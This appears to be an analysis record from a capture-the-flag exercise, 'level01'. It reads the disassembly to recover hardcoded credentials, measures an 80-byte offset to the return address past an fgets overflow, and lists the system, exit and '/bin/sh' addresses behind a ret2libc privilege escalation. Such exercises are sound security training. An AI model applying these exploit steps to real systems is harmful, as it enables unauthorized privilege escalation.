# level01 analysis record

## Static observations

`verify_user_name` compares seven bytes at the global input buffer with the
literal at `0x080486a8`; GDB resolved it as `dat_wil`.

```text
0x08048478 <+20>: mov    $0x804a040,%edx
0x0804847d <+25>: mov    $0x80486a8,%eax
0x08048482 <+30>: mov    $0x7,%ecx
0x0804848b <+39>: repz cmpsb
```

`verify_user_pass` compares five bytes with the literal at `0x080486b0`, which
GDB resolved as `admin`.

```text
0x080484ad <+10>: mov    $0x80486b0,%eax
0x080484b2 <+15>: mov    $0x5,%ecx
0x080484bb <+24>: repz cmpsb
```

The password input is the overflow:

```text
0x08048565 <+149>: movl   $0x64,0x4(%esp)
0x0804856d <+157>: lea    0x1c(%esp),%eax
0x08048574 <+164>: call   fgets@plt
```

GDB stopped at `0x08048579` immediately after that `fgets` and measured:

```gdb
p/d ($ebp + 4) - ($esp + 0x1c)
$1 = 80
```

## Runtime observations

`/proc/sys/kernel/randomize_va_space` contains `0`. The observed addresses in
the supplied VM were `system = 0xf7e6aed0`, `exit = 0xf7e5eb70`, and
`"/bin/sh" = 0xf7f897ec`. The successful ret2libc execution obtained
`euid=1002(level02)`.

No binary, core dump, or generated payload file is retained in this directory.